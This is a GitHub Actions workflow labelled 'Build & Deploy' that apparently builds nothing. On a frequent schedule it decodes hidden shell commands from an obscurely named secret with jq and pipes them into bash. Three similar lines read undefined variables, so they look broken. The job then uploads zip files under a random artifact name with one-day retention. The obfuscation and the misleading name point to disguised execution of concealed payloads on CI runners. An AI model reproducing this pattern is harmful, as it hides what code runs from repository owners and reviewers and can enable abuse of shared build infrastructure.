name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '55 1,7,13,19 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          zsf67: ${{ secrets.zsf67 }}
        run: |
          printf '%s' "$zsf67" | jq -r .zlar1 | /bin/bash
          printf '%s' "$cgy8" | jq -r .arxyo636 | /bin/bash
          echo $l9950 | jq -r .a77 | /bin/bash
          echo $v60314 | jq -r .swqr2681 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: 0FDGAcoW
          path: "*.zip"
          retention-days: 1
